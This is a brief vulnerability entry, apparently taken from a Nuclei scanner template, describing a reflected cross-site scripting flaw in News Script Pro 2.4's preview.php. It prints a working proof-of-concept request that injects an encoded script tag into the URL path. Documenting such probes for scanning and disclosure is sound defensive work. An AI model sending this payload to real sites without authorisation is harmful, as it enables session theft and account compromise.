# Vulnerability: News Script Pro 2.4 - Cross-Site Scripting
**Classification:** CWE-80
**Source:** Nuclei Template (`news-script-xss.yaml`)

## Description
The attacker can send to victim a link containing a malicious URL in an email or instant message can perform a wide variety of actions, such as stealing the victim's session token or login credentials.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/preview.php/mn71q%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3Ep15vr?cat_id=&p=2
```

